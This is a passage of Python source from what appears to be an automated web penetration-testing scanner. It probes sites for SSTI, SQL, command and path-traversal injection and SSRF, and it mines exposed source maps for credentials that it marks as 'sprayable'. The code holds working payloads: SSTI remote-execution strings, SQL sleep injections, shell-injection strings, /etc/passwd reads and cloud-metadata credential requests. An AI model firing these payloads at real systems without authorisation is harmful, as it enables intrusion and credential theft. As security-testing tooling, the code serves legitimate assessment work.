                out.append(_mk(ip, port, "web-jwt", "info",
                               f"JWT uses {alg.upper()} (check RS256->HS256 key-confusion)",
                               ["CWE-347"],
                               f"JWT header alg={alg.upper()} ({red}). Test the algorithm-"
                               "confusion attack (sign with the public key as an HS256 secret).",
                               "Pin the algorithm; don't accept alg switching.",
                               confidence="potential"))
    return out


# --- SSTI / reflected-input quick check -----------------------------------------
# Serialized-object signatures that show up in client-controllable data (cookies /
# hidden form fields). Each is an insecure-deserialization attack surface (ysoserial /
# PHP object injection / ViewState) - the marker alone is unambiguous.
_PHP_SER = re.compile(r'O:\d{1,3}:"[\w\\]{1,64}":\d+:\{')
_VIEWSTATE = re.compile(r'name="__VIEWSTATE"[^>]*\svalue="([^"]+)"', re.I)


def _scan_deserial(ip: str, port: Port, headers: dict, body: str) -> list[Vuln]:
    """Flag serialized-object markers in cookies / hidden fields: a Java serialized
    stream, a PHP serialized object, or an unencrypted ASP.NET ViewState - each is a
    deserialization sink reachable with attacker-controlled input."""
    out: list[Vuln] = []
    cookies = headers.get("set-cookie", "")
    hay = cookies + "\n" + (body or "")
    # Java: base64 of the stream magic AC ED 00 05 ("rO0AB..."), or the raw magic itself.
    if "rO0AB" in hay or "\xac\xed\x00\x05" in hay:
        where = "Set-Cookie" if ("rO0AB" in cookies or "\xac\xed\x00\x05" in cookies) else "response body"
        out.append(_mk(ip, port, "web-deserial", "high",
            "Java serialized object in client-controllable data", ["CWE-502"],
            f"A Java serialized stream (magic AC ED 00 05 / 'rO0AB' base64) appears in the "
            f"{where}. If the server deserializes it, a ysoserial gadget chain yields RCE.",
            "Never deserialize untrusted input; use a look-ahead ObjectInputStream allow-list "
            "or a data-only format (JSON)."))
    m = _PHP_SER.search(cookies) or _PHP_SER.search(body or "")
    if m:
        where = "Set-Cookie" if _PHP_SER.search(cookies) else "response body"
        out.append(_mk(ip, port, "web-deserial", "high",
            "PHP serialized object in client-controllable data", ["CWE-502"],
            f"A PHP serialized object ({m.group(0)[:48]}...) appears in the {where}. If it is "
            "unserialize()d, a POP gadget chain (PHPGGC) can inject objects / reach RCE.",
            "Do not unserialize() attacker input; use json_decode, or restrict allowed_classes."))
    vs = _VIEWSTATE.search(body or "")
    if vs:
        try:
            raw = base64.b64decode(vs.group(1) + "===")
        except Exception:
            raw = b""
        if raw[:2] == b"\xff\x01":            # LOSFormatter marker => not encrypted
            out.append(_mk(ip, port, "web-deserial", "medium",
                "ASP.NET ViewState is not encrypted", ["CWE-502"],
                "__VIEWSTATE decodes to the unencrypted LOSFormatter marker (FF 01). If MAC "
                "is also disabled (EnableViewStateMac=false) or the machineKey leaks, ViewState "
                "is a .NET deserialization RCE sink (ysoserial.net ViewState).",
                "Keep EnableViewStateMac on, encrypt ViewState, and protect the machineKey."))
    return out


def _scan_reflection(ip: str, port: Port, base: str, auth) -> list[Vuln]:
    # One request. {{7*7}} / ${7*7} / <%=7*7%> evaluating to 49 near our canary is a
    # strong, low-false-positive SSTI signal; an unencoded <i> reflection is an
    # XSS lead to verify. Injected into a throwaway param - non-destructive.
    payload = "recceA{{7*7}}recceB${7*7}recceC<%=7*7%>recceD<i>"
    r = _fetch(ip, port, "/?rc=" + quote(payload), auth=auth)
    if not r or r[0] >= 500 or not r[2]:
        return []
    b = r[2]
    out: list[Vuln] = []
    if "recceA49" in b or "recceB49" in b or "recceC49" in b:
        def _probe(p):
            rr = _fetch(ip, port, "/?rc=" + quote(p), auth=auth)
            return rr[2] if rr else ""
        engine, rce = _ssti_identify(_probe)
        out.append(_ssti_finding(ip, port, f"GET {base}/?rc=", engine, rce))
    elif "recceD<i>" in b:
        out.append(_mk(ip, port, "web-reflected", "medium",
                       "Input reflected unencoded (reflected-XSS lead)", ["CWE-79"],
                       f"GET {base}/?rc=…<i> reflected the '<i>' unencoded -> verify for reflected XSS.",
                       "Context-encode all reflected user input.", confidence="potential"))
    return out


# --- client-side JS secret scraping ---------------------------------------------
_JS_SECRETS = [
    (re.compile(r"AIza[0-9A-Za-z_\-]{35}"), "Google API key"),
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS access key id"),
    (re.compile(r"sk_live_[0-9A-Za-z]{16,}"), "Stripe live secret key"),
    (re.compile(r"gh[pousr]_[0-9A-Za-z]{36}"), "GitHub token"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}"), "Slack token"),
    (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "private key"),
    (re.compile(r'apiKey["\']\s*:\s*["\'][^"\']{8,}'), "hardcoded apiKey"),
]
_SCRIPT_SRC = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)


def _scan_js(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    seen_secret: set[str] = set()
    srcs = [s for s in _SCRIPT_SRC.findall(body)
            if "://" not in s and not s.startswith("//")][:8]
    for src in srcs:
        path = src if src.startswith("/") else "/" + src
        r = _fetch(ip, port, path, auth=auth, read=131072)
        if not r or r[0] != 200:
            continue
        js = r[2]
        for rx, label in _JS_SECRETS:
            m = rx.search(js)
            if m and label not in seen_secret:
                seen_secret.add(label)
                out.append(_mk(ip, port, "web-js-secret", "high",
                               f"Secret in client-side JS: {label}", ["CWE-615", "CWE-200"],
                               f"{base}{path} contains a {label} (starts '{m.group(0)[:12]}…').",
                               "Move secrets server-side; rotate any exposed key."))
    return out


_SOURCEMAP_RE = re.compile(r"//[#@]\s*sourceMappingURL\s*=\s*(\S+)")


def _resolve(js_path: str, rel: str) -> str:
    if rel.startswith("/"):
        return rel
    d = js_path.rsplit("/", 1)[0]
    return f"{d}/{rel}"


def _scan_sourcemaps(ip: str, port: Port, base: str, body: str, auth) -> tuple[list, list]:
    """Recover original front-end source from exposed .js.map files (webpack/vite ship
    the original source inline in `sourcesContent`) and mine it for secrets/credentials.
    Returns (findings, [Credential]). Read-only GETs."""
    from . import gitdump
    from .models import Credential
    findings: list = []
    creds: list = []
    srcs = [s for s in _SCRIPT_SRC.findall(body)
            if "://" not in s and not s.startswith("//")][:8]
    map_urls: list = []
    for src in srcs:
        p = src if src.startswith("/") else "/" + src
        if p + ".map" not in map_urls:
            map_urls.append(p + ".map")
        r = _fetch(ip, port, p, auth=auth, read=262144)
        if r and r[0] == 200:
            m = _SOURCEMAP_RE.search(r[2][-4096:])       # the comment sits at the file end
            if m and not m.group(1).startswith("data:"):
                mu = _resolve(p, m.group(1))
                if mu not in map_urls:
                    map_urls.append(mu)
    recovered = 0
    files: list = []
    secrets: list = []
    seen_sec: set = set()
    for mu in map_urls[:12]:
        raw = _fetch_raw(ip, port, mu, auth=auth, read=8_000_000)
        if not raw:
            continue
        try:
            sm = json.loads(raw.decode("utf-8", "replace"))
        except (ValueError, TypeError):
            continue
        if not isinstance(sm, dict):
            continue
        sources = sm.get("sources") or []
        contents = sm.get("sourcesContent") or []
        if not isinstance(contents, list) or not contents:
            continue
        recovered += 1
        for i, content in enumerate(contents[:80]):
            if not isinstance(content, str):
                continue
            spath = str(sources[i]) if i < len(sources) else f"src{i}"
            files.append(spath.replace("webpack://", ""))
            s, c = gitdump._mine(spath, content.encode("utf-8", "replace"))
            for pair in s:
                if pair not in seen_sec:
                    seen_sec.add(pair)
                    secrets.append(pair)
            for cred in c:
                secret = cred.get("secret", "")
                if secret and secret != "(aws-access-key-id)":
                    creds.append(Credential(
                        username=cred.get("username", ""), secret=secret, kind="password",
                        source="web-sourcemap-loot", origin_ip=ip,
                        notes=f"recovered from source map {mu} on {ip}:{port.portid} "
                              "(sprayable)"))
    if recovered:
        detail = (f"Recovered original source from {recovered} source map(s): "
                  f"{len(files)} file(s) incl. "
                  + ", ".join(f for f in files[:6] if f) + (" …" if len(files) > 6 else "")
                  + ".")
        if secrets:
            detail += "\n\nSecrets in recovered source: " + "; ".join(secrets[:8])
        if creds:
            detail += (f"\n\nCAPTURED {len(creds)} credential(s) -> credential store "
                       "(sprayable): " + ", ".join(c.label for c in creds[:6]))
        findings.append(_mk(
            ip, port, "web-sourcemap", "medium",
            "Exposed JavaScript source map - original source recovered",
            ["CWE-540", "CWE-200"], detail,
            "Do not deploy .map files to production (or gate them behind auth); strip "
            "sourcesContent and rotate any leaked secret."))
    return findings, creds


# --- WordPress plugin / version enum (wpscan-lite) ------------------------------
_WP_PLUGINS = ["contact-form-7", "woocommerce", "elementor", "wordpress-seo", "wordfence",
               "akismet", "jetpack", "wpforms-lite", "revslider", "wp-file-manager",
               "duplicator", "all-in-one-wp-migration"]


def _scan_wordpress(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    # Core version from the generator meta or /readme.html.
    ver = ""
    m = re.search(r"WordPress\s+([\d.]+)", body)
    if not m:
        rd = _fetch(ip, port, "/readme.html", auth=auth)
        if rd and rd[0] == 200:
            m = re.search(r"[Vv]ersion\s+([\d.]+)", rd[2])
    if m:
        ver = m.group(1)
        out.append(_mk(ip, port, "web-wp-version", "info",
                       f"WordPress {ver} detected", ["CWE-1104"],
                       f"WordPress core version {ver} (check for known core CVEs; run wpscan).",
                       "Keep WordPress core current."))
    # XML-RPC (brute-force / amplification surface).
    x = _fetch(ip, port, "/xmlrpc.php", method="POST", body="<methodCall></methodCall>", auth=auth)
    if x and x[0] in (200, 405) and "xml" in x[1].get("content-type", "").lower():
        out.append(_mk(ip, port, "web-wp-xmlrpc", "low",
                       "WordPress XML-RPC enabled", ["CWE-799"],
                       f"{base}/xmlrpc.php is enabled (password brute-force + pingback amplification).",
                       "Disable xmlrpc.php if unused."))
    # Installed plugins + their version (readme Stable tag).
    for slug in _WP_PLUGINS:
        r = _fetch(ip, port, f"/wp-content/plugins/{slug}/readme.txt", auth=auth)
        if r and r[0] == 200 and "=== " in r[2]:
            pv = re.search(r"Stable tag:\s*([\d.]+)", r[2])
            pver = pv.group(1) if pv else "?"
            out.append(_mk(ip, port, "web-wp-plugin", "info",
                           f"WordPress plugin '{slug}' v{pver} present", ["CWE-1104"],
                           f"{base}/wp-content/plugins/{slug}/ (readme Stable tag {pver}); "
                           "check it against wpscan/searchsploit.",
                           "Keep plugins current; remove unused ones."))
    return out


# --- authenticated crawler ------------------------------------------------------
# attribute values may be quoted or bare, so accept both.
_HREF_RE = re.compile(r'(?:href|action|src)\s*=\s*["\']?([^"\'>\s]+)', re.I)
_FORM_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.I | re.S)
_ACTION_RE = re.compile(r'action\s*=\s*["\']?([^"\'>\s]+)', re.I)
_METHOD_RE = re.compile(r'method\s*=\s*["\']?([^"\'>\s]+)', re.I)
_INPUT_RE = re.compile(r"<input\b[^>]*>", re.I)
_NAME_RE = re.compile(r'name\s*=\s*["\']?([^"\'>\s]+)', re.I)
_ITYPE_RE = re.compile(r'type\s*=\s*["\']?([^"\'>\s]+)', re.I)


def _same_origin_path(href: str, ip: str, cur_url: str) -> str | None:
    href = (href or "").split("#")[0].strip()
    if not href or href.lower().startswith(("mailto:", "javascript:", "tel:", "data:")):
        return None
    pr = urlparse(urljoin(cur_url, href))
    if pr.scheme not in ("http", "https"):
        return None
    if pr.hostname and pr.hostname != ip:       # same host (IP) only
        return None
    path = pr.path or "/"
    return f"{path}?{pr.query}" if pr.query else path


def _parse_form(html: str, page_path: str) -> dict:
    am = _ACTION_RE.search(html)
    mm = _METHOD_RE.search(html)
    inputs, fields, has_pw, has_token = [], [], False, False
    for inp in _INPUT_RE.findall(html) + re.findall(r"<(?:textarea|select)\b[^>]*>", html, re.I):
        nm = _NAME_RE.search(inp)
        tm = _ITYPE_RE.search(inp)
        name = nm.group(1) if nm else ""
        itype = (tm.group(1).lower() if tm else "text")
        if itype == "password":
            has_pw = True
        if name and re.search(r"csrf|token|authenticity|nonce", name, re.I):
            has_token = True
        if name:
            inputs.append(name)
            fields.append((name, itype))
    return {"action": am.group(1) if am else page_path,
            "method": (mm.group(1).lower() if mm else "get"),
            "inputs": inputs, "fields": fields, "password": has_pw, "csrf": has_token}


# Field types / names we never fuzz (submit buttons, secrets, anti-CSRF tokens).
_SKIP_TYPES = {"password", "submit", "button", "image", "file", "reset", "hidden"}
_SKIP_NAME = re.compile(r"csrf|token|authenticity|nonce|captcha|__viewstate", re.I)


def _fuzzable_fields(form: dict) -> list[str]:
    """Form field names worth injecting into: skip passwords, submit buttons, file
    uploads, and anti-CSRF/hidden token fields. Bounded to keep the request budget sane."""
    out = []
    for name, itype in form.get("fields") or [(n, "text") for n in form.get("inputs", [])]:
        if itype in _SKIP_TYPES or _SKIP_NAME.search(name):
            continue
        if name not in out:
            out.append(name)
    return out[:6]


def crawl(ip: str, port: Port, auth: dict | None = None,
          max_pages: int = 40, max_depth: int = 2) -> dict:
    """Same-origin BFS crawl (as the authenticated user if `auth` is set). Returns
    {'pages': [...], 'forms': [...], 'params': [(path, name), ...]}."""
    from collections import deque
    base = url_for(ip, port)
    seen = {"/"}
    q = deque([("/", 0)])
    pages: list[dict] = []
    forms: list[dict] = []
    params: list[tuple] = []
    pseen: set = set()
    while q and len(pages) < max_pages:
        path, depth = q.popleft()
        r = _fetch(ip, port, path, auth=auth)
        if not r:
            continue
        status, headers, body = r
        pages.append({"path": path, "status": status})
        if "?" in path:
            bp, qs = path.split("?", 1)
            for kv in qs.split("&"):
                if "=" in kv:
                    key = (bp, kv.split("=", 1)[0])
                    if key not in pseen:
                        pseen.add(key)
                        params.append(key)
        if "html" not in headers.get("content-type", "").lower() and body.lstrip()[:1] != "<":
            continue
        cur_url = base + path
        for href in _HREF_RE.findall(body):
            npath = _same_origin_path(href, ip, cur_url)
            if npath and npath not in seen:
                seen.add(npath)
                if depth < max_depth:
                    q.append((npath, depth + 1))
        for fm in _FORM_RE.findall(body):
            forms.append(_parse_form(fm, path))
    return {"pages": pages, "forms": forms, "params": params[:15]}


# --- injection transport (shared by reflection/SSTI + SQLi) ---------------------

def _timed_fetch(ip, port, path, method="GET", body=None, auth=None):
    t0 = time.monotonic()
    r = _fetch(ip, port, path, method=method, body=body, auth=auth)
    return r, time.monotonic() - t0


def _form_request(form: dict, param: str, payload: str):
    """(method, path, body, ctype) that sets `param`=payload and holds the form's other
    fields at a benign baseline value ('1')."""
    fields = {n: "1" for n in form.get("inputs", [])}
    fields[param] = payload
    enc = urlencode(fields)
    if (form.get("method") or "get").lower() == "post":
        return "POST", form["action"], enc, "application/x-www-form-urlencoded"
    sep = "&" if "?" in form["action"] else "?"
    return "GET", f"{form['action']}{sep}{enc}", None, None


def _make_sender(ip: str, port: Port, kind: str, obj, param: str, auth):
    """Return send(payload) -> (response_or_None, elapsed_seconds). `kind` is 'get'
    (obj = path, inject a query param) or 'form' (obj = parsed form, inject a field)."""
    def send(payload: str):
        if kind == "get":
            sep = "&" if "?" in obj else "?"
            return _timed_fetch(ip, port, f"{obj}{sep}{param}=" + quote(payload), auth=auth)
        method, path, body, ctype = _form_request(obj, param, payload)
        extra = dict(auth or {})
        if ctype:
            extra["Content-Type"] = ctype
        return _timed_fetch(ip, port, path, method=method, body=body, auth=extra or None)
    return send


def _body(sr):
    r = sr[0] if sr else None
    return r[2] if r and len(r) > 2 else None


# --- reflection / SSTI (canary) -------------------------------------------------

# Second-stage SSTI discriminators: which engine, and its exact RCE payload. Each probe
# uses a marker the plain literal can't reproduce (string×int repetition, etc.).
_SSTI_ENGINES = [
    ("recceX{{7*'7'}}recceX", "recceX7777777recceX", "Jinja2 (Python)",
     "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
    ("recceX{{7*'7'}}recceX", "recceX49recceX", "Twig (PHP)",
     "{{['id']|filter('system')}}  (or registerUndefinedFilterCallback('system') → getFilter('id'))"),
    ("recceY${7*'7'}recceY", "recceY7777777recceY", "Mako (Python)",
     "${__import__('os').popen('id').read()}"),
    ("recceZ${7*7}recceZ", "recceZ49recceZ", "Freemarker (Java)",
     "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"),
    ("recceS{7*7}recceS", "recceS49recceS", "Smarty (PHP)", "{system('id')}"),
    ("recceW<%=7*7%>recceW", "recceW49recceW", "ERB / JSP",
     "<%= `id` %> (ERB)  /  <%= Runtime.getRuntime().exec(\"id\") %> (JSP)"),
]


def _ssti_identify(probe) -> tuple[str, str]:
    """`probe(payload) -> body`. Returns (engine, rce_payload) or ("", "")."""
    for payload, marker, engine, rce in _SSTI_ENGINES:
        b = probe(payload)
        if b and marker in b:
            return engine, rce
    return "", ""


def _ssti_finding(ip, port, where, engine, rce):
    title = "Server-Side Template Injection"
    detail = f"{where} evaluated our template payload to 49 - the engine executed our input."
    if engine:
        title += f" — {engine} (RCE)"
        detail += f"\n\nEngine: {engine}. RCE payload: {rce}"
    return _mk(ip, port, "web-ssti", "high" if not engine else "critical", title,
               ["CWE-1336", "CWE-94"], detail,
               "Never render user input as a template; use a sandboxed/logic-less engine "
               "and escape all input.", confidence="confirmed")


def _reflect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
    b = _body(send("recceA{{7*7}}recceD<i>"))
    if not b:
        return []
    if "recceA49" in b:
        engine, rce = _ssti_identify(lambda p: _body(send(p)) or "")
        return [_ssti_finding(ip, port, where, engine, rce)]
    if "recceD<i>" in b:
        return [_mk(ip, port, "web-reflected", "medium",
                    f"Input reflected unencoded in {where} (reflected-XSS lead)", ["CWE-79"],
                    f"{where} reflected '<i>' unencoded - verify for XSS.",
                    "Context-encode reflected user input.", confidence="potential")]
    return []


def _reflect_param(ip: str, port: Port, page_path: str, param: str, auth) -> list[Vuln]:
    return _reflect_via(ip, port, f"param '{param}' on {page_path}",
                        _make_sender(ip, port, "get", page_path, param, auth))


# --- SQL injection (error / boolean / opt-in time), non-destructive payloads -----
# All payloads live inside a SELECT/WHERE context (quote-break + AND/OR sleep) - no
# stacked DROP/UPDATE/DELETE, so a probe only reads, never modifies.
_SQL_ERRORS = [
    (re.compile(r"SQL syntax.*?MySQL|check the manual that corresponds to your (MySQL|MariaDB)|"
                r"MySqlException|valid MySQL result|com\.mysql\.jdbc|mysqli?_", re.I), "MySQL"),
    (re.compile(r"PostgreSQL.*?ERROR|pg_query\(\)|PSQLException|syntax error at or near|"
                r"unterminated quoted string|org\.postgresql", re.I), "PostgreSQL"),
    (re.compile(r"Microsoft SQL Server|ODBC SQL Server Driver|SQLServerException|"
                r"Unclosed quotation mark after|Incorrect syntax near|System\.Data\.SqlClient",
                re.I), "MSSQL"),
    (re.compile(r"ORA-[0-9]{5}|Oracle error|quoted string not properly terminated|"
                r"PLS-[0-9]{5}|oracle\.jdbc", re.I), "Oracle"),
    (re.compile(r"SQLite/JDBCDriver|SQLiteException|sqlite3\.OperationalError|"
                r"unrecognized token|near \".{0,20}\": syntax error", re.I), "SQLite"),
    (re.compile(r"SQLSTATE\[|DB2 SQL error|Sybase message|Npgsql\.|"
                r"java\.sql\.SQLException", re.I), "SQL"),
]
# '§' is replaced with the sleep duration at probe time.
_SLEEP_PAYLOADS = [
    "1' AND SLEEP(§)-- -",                              # MySQL (string context)
    "1 AND SLEEP(§)",                                   # MySQL (numeric context)
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(§))-- -",         # PostgreSQL
    "1';WAITFOR DELAY '0:0:§'-- -",                     # MSSQL (delay only)
]


def _sql_error(body: str):
    for rx, lbl in _SQL_ERRORS:
        if rx.search(body or ""):
            return lbl
    return None


def _similar(a, b) -> float:
    if a is None or b is None:
        return 0.0
    return difflib.SequenceMatcher(None, a[:3000], b[:3000]).ratio()


def _sqli_via(ip: str, port: Port, where: str, send, time_based: bool = False) -> list[Vuln]:
    """Error-based + boolean-based (default) and, opt-in, time-based SQLi on one input.
    Returns at most one finding (the strongest technique that fires)."""
    def mk(tech, detail):
        return [_mk(ip, port, "web-sqli", "high",
                    f"SQL injection in {where} ({tech})", ["CWE-89"], detail,
                    "Use parameterised queries / prepared statements; never build SQL by "
                    "string concatenation. Validate + canonicalise input.")]

    # 1) Error-based: a DBMS error that appears only after we break out of the quote.
    base = _body(send("1"))
    if base is not None and not _sql_error(base):
        for q in ("'", "\"", "')", "\\"):
            rb = _body(send("1" + q))
            lbl = _sql_error(rb) if rb is not None else None
            if lbl:
                return mk(f"error-based, {lbl}",
                          f"Injecting {q!r} into {where} triggered a {lbl} database error - "
                          "the app passed our input straight into a SQL query.")

    # 2) Boolean-based blind: TRUE ~ baseline, FALSE diverges, and it reproduces.
    b1, b2 = _body(send("1")), _body(send("1"))
    if b1 and b2 and _similar(b1, b2) >= 0.95:          # skip highly dynamic pages
        for tp, fp in (("1 AND 1=1", "1 AND 1=2"), ("1' AND '1'='1", "1' AND '1'='2")):
            bt, bf = _body(send(tp)), _body(send(fp))
            if not bt or not bf:
                continue
            if _similar(bt, b1) >= 0.95 and _similar(bf, b1) <= 0.9 and _similar(bt, bf) <= 0.9:
                bt2, bf2 = _body(send(tp)), _body(send(fp))   # confirm it reproduces
                if bt2 and bf2 and _similar(bt2, b1) >= 0.95 and _similar(bf2, b1) <= 0.9:
                    return mk("boolean-based blind",
                              f"A true condition ({tp!r}) returned the baseline page while a "
                              f"false one ({fp!r}) returned a different page - the app evaluates "
                              "our injected SQL boolean.")

    # 3) Time-based blind (opt-in): a DB sleep delays the response, scaling with the arg.
    if time_based:
        samples = [el for el in (send("1")[1], send("1")[1])]
        base_t = sorted(samples)[len(samples) // 2] if samples else 0.0
        for tmpl in _SLEEP_PAYLOADS:
            _, e5 = send(tmpl.replace("§", "5"))
            if e5 >= base_t + 4.0:
                _, e2 = send(tmpl.replace("§", "2"))        # must scale with the sleep arg
                if (e5 - e2) >= 1.5:
                    return mk("time-based blind",
                              "A sleep payload delayed the response ~5s (and ~2s for the 2s "
                              "variant), so our injected SQL controls execution time.")
    return []


# --- OS command injection -------------------------------------------------------
# Output-based proof uses shell arithmetic ($((a*b))) so the confirming marker
# (cmdi<product>) can ONLY appear if a shell evaluated our input - plain reflection of
# the literal payload can't produce the computed number, so it's a zero-FP signal.
_CMDI_A, _CMDI_B = 1009, 1013
_CMDI_MARK = f"cmdi{_CMDI_A * _CMDI_B}"                  # cmdi1022117
_CMDI_OUT = [
    f"; echo cmdi$(({_CMDI_A}*{_CMDI_B}))",
    f"| echo cmdi$(({_CMDI_A}*{_CMDI_B}))",
    f"$(echo cmdi$(({_CMDI_A}*{_CMDI_B})))",
    f"`echo cmdi$(({_CMDI_A}*{_CMDI_B}))`",
    f"%0aecho cmdi$(({_CMDI_A}*{_CMDI_B}))",
    f"; echo cmdi`expr {_CMDI_A} \\* {_CMDI_B}`",
    f"& set /a cmdi=cmdi{_CMDI_A}*{_CMDI_B}",           # (best-effort Windows arithmetic)
]
_CMDI_SLEEP = ["; sleep §", "| sleep §", "$(sleep §)", "`sleep §`", "&& sleep §",
               "& ping -n § 127.0.0.1", "%0asleep §"]


def _cmdi_via(ip: str, port: Port, where: str, param: str, send,
              time_based: bool = False) -> list[Vuln]:
    """OS command injection. Output-based (a shell-computed marker reflection can't fake)
    plus, opt-in, time-based (a sleep that scales the response delay)."""
    def mk(tech, detail):
        return [_mk(ip, port, "web-cmdi", "critical",
                    f"OS command injection in {where} ({tech})", ["CWE-78"], detail,
                    "Never pass user input to a shell; call the program directly with an "
                    "argument array / a safe library API; allow-list + validate input.",
                    confidence="confirmed")]

    for p in _CMDI_OUT:
        b = _body(send(p))
        if b and _CMDI_MARK in b:
            return mk("output-based",
                      f"{where} set to {p!r} made the response contain {_CMDI_MARK!r} - the "
                      "shell evaluated our arithmetic, so the app runs our input in a shell.")
    if time_based:
        samples = [send("1")[1], send("1")[1]]
        base_t = min(samples) if samples else 0.0
        for tmpl in _CMDI_SLEEP:
            _, e5 = send(tmpl.replace("§", "5"))
            if e5 >= base_t + 4.0:
                _, e2 = send(tmpl.replace("§", "2"))        # must scale with the sleep arg
                if (e5 - e2) >= 1.5:
                    return mk("time-based",
                              "A sleep payload delayed the response ~5s (and ~2s for the 2s "
                              "variant), so our input controls a shell's execution time.")
    return []


# --- open redirect --------------------------------------------------------------
_REDIR_HOST = "recce-oob.example"                       # a host we'll never legitimately host
_REDIR_PAYLOADS = (f"https://{_REDIR_HOST}/x", f"//{_REDIR_HOST}/x", f"/\\{_REDIR_HOST}/x")


def _open_redirect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
    """A parameter reflected into the Location of a 3xx pointing at an attacker host.
    Reads the redirect only (http.client does not auto-follow) - non-destructive."""
    for payload in _REDIR_PAYLOADS:
        r = send(payload)[0]
        if not r or not (300 <= r[0] < 400):
            continue
        loc = (r[1].get("location") or "").strip()
        low = loc.lower()
        if low.startswith((f"https://{_REDIR_HOST}", f"http://{_REDIR_HOST}",
                           f"//{_REDIR_HOST}", f"/\\{_REDIR_HOST}")):
            return [_mk(ip, port, "web-openredirect", "medium",
                        f"Open redirect via {where}", ["CWE-601"],
                        f"{where} set to {payload!r} -> HTTP {r[0]} Location: {loc[:120]} "
                        "(redirects to an attacker-controlled host).",
                        "Allow-list redirect targets; never redirect to a raw user value.",
                        confidence="confirmed")]
    return []


# --- generic path traversal / local file read ----------------------------------
_TRAVERSAL_PAYLOADS = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "../../../../../../../../windows/win.ini",
)
_TRAVERSAL_HIT = re.compile(r"root:.*?:0:0:|\[fonts\]|\[extensions\]", re.I)
# Only worth traversing params that plausibly name a file/path (keeps the budget + FP low).
_FILEISH_PARAM = re.compile(
    r"file|path|page|template|doc|download|include|dir|folder|load|read|view|attachment|img|src",
    re.I)


# SSRF: parameters that plausibly carry a URL/host the server will fetch.
_SSRF_PARAM = re.compile(
    r"url|uri|link|src|source|dest|target|redirect|feed|image|img|host|domain|callback|"
    r"webhook|proxy|fetch|remote|load|open|site|endpoint|server|address|api|next|"
    r"return|continue|to|out|data|resource|path|file|document|view|window|port", re.I)
# (payload, response-marker, what-it-proves). The metadata/IMDS hits are credential theft.
_SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     re.compile(r"AccessKeyId|SecretAccessKey|\bToken\b|Expiration"),
     "AWS IAM role credentials via the instance metadata service (IMDSv1)"),
    ("http://169.254.169.254/latest/meta-data/",
     re.compile(r"ami-id|instance-id|instance-action|local-ipv4|iam/|placement/|"
                r"security-credentials"),
     "AWS instance metadata (IMDSv1)"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
     re.compile(r"default/|service-accounts|scopes|email"),
     "GCP instance metadata (service-account tokens)"),
    ("file:///etc/passwd", re.compile(r"root:.*:0:0:"),
     "local file /etc/passwd via the file:// scheme"),
]


def _ssrf_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
    """Point a URL-ish parameter at cloud-metadata / file:// and confirm SSRF when the
    server fetches it and the metadata/file content comes back in the response."""
    if not _SSRF_PARAM.search(param):
        return []
    for payload, marker, what in _SSRF_PAYLOADS:
        b = _body(send(payload))
        if b and marker.search(b):
            cloud = "metadata" in what.lower() or "imds" in what.lower()
            sev = "critical" if cloud else "high"
            return [_mk(ip, port, "web-ssrf", sev,
                        f"Server-Side Request Forgery via {where}", ["CWE-918"],
                        f"{where} set to {payload!r} caused the server to fetch it and the "
                        f"response returned {what} - SSRF confirmed (the app requests a "
                        "URL taken from our input).",
                        "Allow-list outbound destinations; block link-local/metadata IPs "
                        "(169.254.169.254); enforce IMDSv2; disable file://.",
                        confidence="confirmed")]
    return []


def _traversal_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
    if not _FILEISH_PARAM.search(param):
        return []
    for payload in _TRAVERSAL_PAYLOADS:
        b = _body(send(payload))
        if b and _TRAVERSAL_HIT.search(b):
            what = "/etc/passwd" if "win.ini" not in payload else "windows/win.ini"
            return [_mk(ip, port, "web-lfi", "high",
                        f"Path traversal / local file read via {where}", ["CWE-22"],
                        f"{where} set to {payload!r} returned {what} content "
                        "(the app reads a file path from our input).",
                        "Canonicalise + allow-list file paths; never build a path from raw "
                        "user input.", confidence="confirmed")]
    return []


# A form is NOT auto-submitted when its action verb OR one of its fields signals a real
# side effect (state change / transaction / content post / file upload). Submitting such
# a form with junk values could delete data, place an order, send mail, invite users,
# etc. Login/search/filter/generic forms (where injection actually lives) stay fuzzable.
_SKIP_FORM_ACTION = re.compile(
    r"delete|remove|destroy|\bdrop\b|wipe|purge|reset|revoke|disable|deactivate|ban|"
    r"kick|logout|sign.?out|transfer|pay(ment)?|checkout|order|buy|purchase|invite|"
    r"subscribe|unsubscribe|register|sign.?up|upload|import|export|\bsend\b|e?mail|"
    r"message|comment|publish|deploy|exec(ute)?|restart|reboot|shutdown|approve", re.I)
_SENSITIVE_FIELD = re.compile(
    r"amount|price|\bqty\b|quantity|total|card|cvv|cvc|iban|swift|routing|account|"
    r"recipient|payee|e?mail|phone|mobile|\bssn\b|\bdob\b|message|subject|\bbody\b|"
    r"comment|content|\botp\b|\bpin\b|upload|attachment", re.I)


def _form_risk(form: dict, allow_risky: bool = False) -> str:
    """Reason this form should NOT be auto-submitted during fuzzing (side-effect risk),
    or '' if it is safe to fuzz. A file-upload form is never auto-submitted. With
    allow_risky the state-change/transaction guards are relaxed (uploads still skipped)."""
    for name, itype in form.get("fields") or []:
        if itype == "file":
            return f"has a file-upload field '{name}'"
    if allow_risky:
        return ""
    action = form.get("action", "")
    if _SKIP_FORM_ACTION.search(action):
        return f"action '{action[:60]}' looks state-changing"
    for name, _itype in form.get("fields") or []:
        if _SENSITIVE_FIELD.search(name):
            return f"has a sensitive/transactional field '{name}'"
    return ""


def _crawl_findings(ip: str, port: Port, cres: dict) -> list[Vuln]:
    out: list[Vuln] = []
    tls = probes._is_tls(port)
    for f in cres["forms"]:
        if f["password"] and not tls:
